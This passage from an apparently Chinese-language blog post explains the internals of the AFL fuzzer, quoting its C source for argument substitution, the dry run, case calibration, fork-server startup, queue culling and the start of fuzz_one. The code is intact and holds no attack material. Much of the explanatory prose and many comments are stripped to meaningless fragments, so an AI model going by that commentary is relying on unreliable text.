*n_arg;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* If we don&#x27;t have a file name chosen yet, use a safe default. */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!out_file)</span><br><span class="line">        out_file = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/.cur_input&quot;</span>, out_dir);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Be sure that we&#x27;re always using fully-qualified paths. */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (out_file[<span class="number">0</span>] == <span class="string">&#x27;/&#x27;</span>) aa_subst = out_file;</span><br><span class="line">      <span class="keyword">else</span> aa_subst = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/%s&quot;</span>, cwd, out_file);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Construct a replacement argv value. */</span></span><br><span class="line"></span><br><span class="line">      *aa_loc = <span class="number">0</span>;</span><br><span class="line">      n_arg = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s%s%s&quot;</span>, argv[i], aa_subst, aa_loc + <span class="number">2</span>);</span><br><span class="line">      argv[i] = n_arg;</span><br><span class="line">      *aa_loc = <span class="string">&#x27;@&#x27;</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (out_file[<span class="number">0</span>] != <span class="string">&#x27;/&#x27;</span>) <span class="built_in">ck_free</span>(aa_subst);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    i++;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(cwd); <span class="comment">/* not tracked */</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="setup-stdio-check-binary"><a href="#setup-stdio-check-binary" class="headerlink" title="setup stdio -&gt; check binary"></a>setup stdio -&gt; check binary</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  .cur_input  out_fd fuzzer  input  child </span></span><br><span class="line"><span class="keyword">if</span> (!out_file) <span class="built_in">setup_stdio_file</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//  /tmp </span></span><br><span class="line"><span class="comment">// shellelf</span></span><br><span class="line"><span class="built_in">check_binary</span>(argv[optind]);</span><br></pre></td></tr></table></figure><h2 id="perform-dry-run"><a href="#perform-dry-run" class="headerlink" title="perform_dry_run"></a>perform_dry_run</h2><p> queue  fork server dry run calibrate</p><ul><li>queue</li><li><code>calibrate_case</code><code>res</code></li><li><code>res</code></li></ul><h3 id="calibrate-case"><a href="#calibrate-case" class="headerlink" title="calibrate_case"></a>calibrate_case</h3><p></p><ul><li>FAULT_NONEcrash</li><li>FAULT_TMOUT<code>timeout_given</code>2</li><li>FAULT_CRASH mem_limit</li><li>FAULT_ERROR</li><li>FAULT_NOINST</li><li>FAULT_NOBITS</li></ul><p><code>calibrate_case</code> corpus queue <strong> queue <code>calibrate_case</code></strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> u8 <span class="title">calibrate_case</span><span class="params">(<span class="type">char</span>** argv, <span class="keyword">struct</span> queue_entry* q, u8* use_mem,</span></span></span><br><span class="line"><span class="params"><span class="function">                         u32 handicap, u8 from_queue)</span></span></span><br></pre></td></tr></table></figure><p> 8 </p><ul><li> fork server <strong><code>init_forkserver()</code> fork server</strong></li><li><strong><code>run_target()</code></strong> hit count </li><li> 40 <code>var_bytes[]</code> shm  queue entry <code>var_behavior</code><code>1</code></li><li> queue entry <code>exec_us</code></li><li><strong><code>top_rated</code></strong></li></ul><h3 id="init-forkserver"><a href="#init-forkserver" class="headerlink" title="init forkserver"></a>init forkserver</h3><p>fuzzer  forkserver</p><ol><li>forkfork server</li><li><ul><li>12dev_null_fd</li><li>out_file0out_fddev_null_fd</li></ul></li><li>FORKSRV_FDFORKSRV_FD+1</li><li>execvforkserverIPC</li><li>forkserver4forkserver</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Spin up fork server (instrumented mode only). The idea is explained here:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   http://lcamtuf.blogspot.com/2014/10/fuzzing-binaries-without-execve.html</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   In essence, the instrumentation allows us to skip execve(), and just keep</span></span><br><span class="line"><span class="comment">   cloning a stopped child. So, we just execute once, and then send commands</span></span><br><span class="line"><span class="comment">   through a pipe. The other part of this logic is in afl-as.h. */</span></span><br><span class="line"></span><br><span class="line"><span class="function">EXP_ST <span class="type">void</span> <span class="title">init_forkserver</span><span class="params">(<span class="type">char</span>** argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">static</span> <span class="keyword">struct</span> <span class="title class_">itimerval</span> it;</span><br><span class="line">  <span class="comment">// status pipe</span></span><br><span class="line">  <span class="comment">// control pipe</span></span><br><span class="line">  <span class="type">int</span> st_pipe[<span class="number">2</span>], ctl_pipe[<span class="number">2</span>];</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line">  s32 rlen;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">ACTF</span>(<span class="string">&quot;Spinning up the fork server...&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">pipe</span>(st_pipe) || <span class="built_in">pipe</span>(ctl_pipe)) <span class="built_in">PFATAL</span>(<span class="string">&quot;pipe() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">  forksrv_pid = fork();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (forksrv_pid &lt; <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;fork() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// </span></span><br><span class="line">  <span class="keyword">if</span> (!forksrv_pid) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">rlimit</span> r;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Umpf. On OpenBSD, the default fd limit for root users is set to</span></span><br><span class="line"><span class="comment">       soft 128. Let&#x27;s try to fix that... */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">getrlimit</span>(RLIMIT_NOFILE, &amp;r) &amp;&amp; r.rlim_cur &lt; FORKSRV_FD + <span class="number">2</span>) &#123;</span><br><span class="line"></span><br><span class="line">      r.rlim_cur = FORKSRV_FD + <span class="number">2</span>;</span><br><span class="line">      <span class="built_in">setrlimit</span>(RLIMIT_NOFILE, &amp;r); <span class="comment">/* Ignore errors */</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mem_limit) &#123;</span><br><span class="line"></span><br><span class="line">      r.rlim_max = r.rlim_cur = ((<span class="type">rlim_t</span>)mem_limit) &lt;&lt; <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RLIMIT_AS</span></span><br><span class="line"></span><br><span class="line">      <span class="built_in">setrlimit</span>(RLIMIT_AS, &amp;r); <span class="comment">/* Ignore errors */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* This takes care of OpenBSD, which doesn&#x27;t have RLIMIT_AS, but</span></span><br><span class="line"><span class="comment">         according to reliable sources, RLIMIT_DATA covers anonymous</span></span><br><span class="line"><span class="comment">         maps - so we should be getting good protection against OOM bugs. */</span></span><br><span class="line"></span><br><span class="line">      <span class="built_in">setrlimit</span>(RLIMIT_DATA, &amp;r); <span class="comment">/* Ignore errors */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* ^RLIMIT_AS */</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Dumping cores is slow and can lead to anomalies if SIGKILL is delivered</span></span><br><span class="line"><span class="comment">       before the dump is complete. */</span></span><br><span class="line"></span><br><span class="line">    r.rlim_max = r.rlim_cur = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">setrlimit</span>(RLIMIT_CORE, &amp;r); <span class="comment">/* Ignore errors */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Isolate the process and configure standard descriptors. If out_file is</span></span><br><span class="line"><span class="comment">       specified, stdin is /dev/null; otherwise, out_fd is cloned instead. */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">setsid</span>();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">dup2</span>(dev_null_fd, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">dup2</span>(dev_null_fd, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (out_file) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">dup2</span>(dev_null_fd, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">dup2</span>(out_fd, <span class="number">0</span>);</span><br><span class="line">      <span class="built_in">close</span>(out_fd);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Set up control and status pipes, close the unneeded original fds. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">dup2</span>(ctl_pipe[<span class="number">0</span>], FORKSRV_FD) &lt; <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;dup2() failed&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">dup2</span>(st_pipe[<span class="number">1</span>], FORKSRV_FD + <span class="number">1</span>) &lt; <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;dup2() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">close</span>(ctl_pipe[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">close</span>(ctl_pipe[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">close</span>(st_pipe[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">close</span>(st_pipe[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">close</span>(out_dir_fd);</span><br><span class="line">    <span class="built_in">close</span>(dev_null_fd);</span><br><span class="line">    <span class="built_in">close</span>(dev_urandom_fd);</span><br><span class="line">    <span class="built_in">close</span>(<span class="built_in">fileno</span>(plot_file));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This should improve performance a bit, since it stops the linker from</span></span><br><span class="line"><span class="comment">       doing extra work post-fork(). */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">getenv</span>(<span class="string">&quot;LD_BIND_LAZY&quot;</span>)) <span class="built_in">setenv</span>(<span class="string">&quot;LD_BIND_NOW&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Set sane defaults for ASAN if nothing else specified. */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">setenv</span>(<span class="string">&quot;ASAN_OPTIONS&quot;</span>, <span class="string">&quot;abort_on_error=1:&quot;</span></span><br><span class="line">                           <span class="string">&quot;detect_leaks=0:&quot;</span></span><br><span class="line">                           <span class="string">&quot;symbolize=0:&quot;</span></span><br><span class="line">                           <span class="string">&quot;allocator_may_return_null=1&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* MSAN is tricky, because it doesn&#x27;t support abort_on_error=1 at this</span></span><br><span class="line"><span class="comment">       point. So, we do this in a very hacky way. */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">setenv</span>(<span class="string">&quot;MSAN_OPTIONS&quot;</span>, <span class="string">&quot;exit_code=&quot;</span> <span class="built_in">STRINGIFY</span>(MSAN_ERROR) <span class="string">&quot;:&quot;</span></span><br><span class="line">                           <span class="string">&quot;symbolize=0:&quot;</span></span><br><span class="line">                           <span class="string">&quot;abort_on_error=1:&quot;</span></span><br><span class="line">                           <span class="string">&quot;allocator_may_return_null=1:&quot;</span></span><br><span class="line">                           <span class="string">&quot;msan_track_origins=0&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//  execv</span></span><br><span class="line">    <span class="comment">//  afl-gcc </span></span><br><span class="line">    <span class="built_in">execv</span>(target_path, argv);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Use a distinctive bitmap signature to tell the parent about execv()</span></span><br><span class="line"><span class="comment">       falling through. */</span></span><br><span class="line"></span><br><span class="line">    *(u32*)trace_bits = EXEC_FAIL_SIG;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// </span></span><br><span class="line">  <span class="comment">/* Close the unneeded endpoints. */</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">close</span>(ctl_pipe[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">close</span>(st_pipe[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  fsrv_ctl_fd = ctl_pipe[<span class="number">1</span>];</span><br><span class="line">  fsrv_st_fd  = st_pipe[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Wait for the fork server to come up, but don&#x27;t wait too long. */</span></span><br><span class="line"></span><br><span class="line">  it.it_value.tv_sec = ((exec_tmout * FORK_WAIT_MULT) / <span class="number">1000</span>);</span><br><span class="line">  it.it_value.tv_usec = ((exec_tmout * FORK_WAIT_MULT) % <span class="number">1000</span>) * <span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">setitimer</span>(ITIMER_REAL, &amp;it, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// </span></span><br><span class="line">  rlen = <span class="built_in">read</span>(fsrv_st_fd, &amp;status, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">  it.it_value.tv_sec = <span class="number">0</span>;</span><br><span class="line">  it.it_value.tv_usec = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">setitimer</span>(ITIMER_REAL, &amp;it, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If we have a four-byte &quot;hello&quot; message from the server, we&#x27;re all set.</span></span><br><span class="line"><span class="comment">     Otherwise, try to figure out what went wrong. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (rlen == <span class="number">4</span>) &#123;</span><br><span class="line">    <span class="built_in">OKF</span>(<span class="string">&quot;All right - fork server is up.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (child_timed_out)</span><br><span class="line">    <span class="built_in">FATAL</span>(<span class="string">&quot;Timeout while initializing fork server (adjusting -t may help)&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// </span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">waitpid</span>(forksrv_pid, &amp;status, <span class="number">0</span>) &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">PFATAL</span>(<span class="string">&quot;waitpid() failed&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// SAYF...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="cull-queue"><a href="#cull-queue" class="headerlink" title="cull_queue"></a>cull_queue</h3><p></p><ul><li>temp_vtrace_mini<code>MAP_SIZE &gt;&gt; 3</code></li><li>bit11</li><li>temp_vtop_ratedtrace_mini</li><li>temp_vAFLfavorablefavored1</li><li>favored<code>mark_as_redundant</code>q-&gt;fs_redundant1 out_dir&#x2F;queue&#x2F;.state&#x2F;redundant_edges&#x2F;  favored </li></ul><h2 id="while-1-fuzz-"><a href="#while-1-fuzz-" class="headerlink" title="while 1: fuzz "></a>while 1: fuzz </h2><p>fuzzfuzz<code>fuzz_one</code><code>cull_queue</code>AFL</p><ol><li>cull_queue</li><li>queue_curqueuequeuefuzz<ul><li></li><li>queuetest_casefuzz</li></ul></li><li><code>fuzz_one</code>queue_cur</li><li>queue_cur</li></ol><h3 id="fuzz-one"><a href="#fuzz-one" class="headerlink" title="fuzz one"></a>fuzz one</h3><p>fuzz</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take the current entry from the queue, fuzz it for a while. This</span></span><br><span class="line"><span class="comment">   function is a tad too long... returns 0 if fuzzed successfully, 1 if</span></span><br><span class="line"><span class="comment">   skipped or bailed out. */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* fuzz_onequeue_curfuzz_onequeue_cur</span></span><br><span class="line"><span class="comment">   10 */</span></span><br><span class="line"><span class="function"><span class="type">static</span> u8 <span class="title">fuzz_one</span><span class="params">(<span class="type">char</span>** argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  s32 len, fd, temp_len, i, j;</span><br><span class="line">  u8  *in_buf, *out_buf, *orig_in, *ex_tmp, *eff_map = <span class="number">0</span>;</span><br><span class="line">  u64 havoc_queued,  orig_hit_cnt, new_hit_cnt;</span><br><span class="line">  u32 splice_cycle = <span class="number">0</span>, perf_score = <span class="number">100</span>, orig_perf, prev_cksum, eff_cnt = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  u8  ret_val = <span class="number">1</span>, doing_det = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  u8  a_collect[MAX_AUTO_EXTRA];</span><br><span class="line">  u32 a_len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> IGNORE_FINDS</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In IGNORE_FINDS mode, skip any entries that weren&#x27;t in the</span></span><br><span class="line"><span class="comment">     initial data set. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (queue_cur-&gt;depth &gt; <span class="number">1</span>) </span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* pending_favoredconfig.h</span></span><br><span class="line"><span class="comment">     1.0queue_curfuzzfavored99%1</span></span><br><span class="line"><span class="comment">     2.0dumb_modefavoredqueued_paths&gt;10</span></span><br><span class="line"><span class="comment">        a.queue_cycle1fuzz95%1</span></span><br><span class="line"><span class="comment">        b.75%1</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">if</span> (pending_favored) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If we have any favored, non-fuzzed new arrivals in the queue,</span></span><br><span class="line"><span class="comment">       possibly skip to them at the expense of already-fuzzed or non-favored</span></span><br><span class="line"><span class="comment">       cases. */</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ((queue_cur-&gt;was_fuzzed || !queue_cur-&gt;favored) &amp;&amp;</span><br><span class="line">        <span class="built_in">UR</span>(<span class="number">100</span>) &lt; SKIP_TO_NEW_PROB) </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!dumb_mode &amp;&amp; !queue_cur-&gt;favored &amp;&amp; queued_paths &gt; <span class="number">10</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Otherwise, still possibly skip non-favored cases, albeit less often.</span></span><br><span class="line"><span class="comment">       The odds of skipping stuff are higher for already-fuzzed inputs and</span></span><br><span class="line"><span class="comment">       lower for never-fuzzed entries. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (queue_cycle &gt; <span class="number">1</span> &amp;&amp; !queue_cur-&gt;was_fuzzed) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">UR</span>(<span class="number">100</span>) &lt; SKIP_NFAV_NEW_PROB) </span><br><span class="line">          <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">UR</span>(<span class="number">100</span>) &lt; SKIP_NFAV_OLD_PROB) </span><br><span class="line">          <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* ^IGNORE_FINDS */</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ttystdout */</span></span><br><span class="line">  <span class="keyword">if</span> (not_on_tty) &#123;</span><br><span class="line">    <span class="built_in">ACTF</span>(<span class="string">&quot;Fuzzing test case #%u (%u total, %llu uniq crashes found)...&quot;</span>,</span><br><span class="line">         current_entry, queued_paths, unique_crashes);</span><br><span class="line">    <span class="built_in">fflush</span>(stdout);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Map the test case into memory. */</span></span><br><span class="line">    </span><br><span 